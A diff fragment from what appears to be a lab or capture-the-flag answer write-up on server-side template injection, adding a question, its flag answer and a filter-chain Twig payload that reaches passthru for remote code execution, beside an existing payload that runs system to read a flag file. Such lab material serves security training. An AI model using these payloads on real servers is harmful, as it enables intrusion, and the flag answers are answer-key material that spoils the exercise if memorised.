@@ -55,6 +55,13 @@ Answer - OS{PlaviOrkestar}
 {{[0]|reduce('system', 'cat /var/www/flag.txt')}}
 ```
 
+2. Review the documentation and find the other filters that result in RCE. A successful use will result in a flag being displayed.
+
+Answer - OS{CrvenaJabuka}
+
+```
+{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
+```
 
 ## **Apache Freemarker - Discovery**
 
